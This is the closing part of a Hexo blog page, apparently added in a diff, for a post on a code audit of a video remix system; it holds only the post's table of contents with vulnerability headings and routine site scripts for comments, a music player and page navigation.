href="#%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F"><span class="toc-number">4.3.</span> <span class="toc-text">数据大屏:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E1"><span class="toc-number">5.</span> <span class="toc-text">漏洞1:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.1.</span> <span class="toc-text">弱口令漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E2"><span class="toc-number">6.</span> <span class="toc-text">漏洞2:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E9%81%93%E4%BA%91%E5%90%8E%E2%BB%94-%E7%AE%A1%E7%90%86%E5%91%98%E7%AD%89%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">6.1.</span> <span class="toc-text">可道云后⻔+管理员等账号密码信息泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E6%93%8D%E7%BA%B5%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">前台未授权操纵漏洞:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.1.</span> <span class="toc-text">变量覆盖漏洞:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B7%AF%E5%BE%84%E5%A4%84"><span class="toc-number">7.1.1.</span> <span class="toc-text">漏洞路径处:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BA%E7%8E%B0%E5%A4%84"><span class="toc-number">7.1.2.</span> <span class="toc-text">漏洞出现处:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.2.</span> <span class="toc-text">任意文件读取和SSRF漏洞:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2024/04/16/某小学AK-SK泄露导致横向到云主机控制台/">某小学AK,SK泄露导致横向到云主机控制台</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2024/04/25/某音矩阵云混剪系统V2-3-0代码审计-1/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~大噶好。唔系小鱼，欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">暂无</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
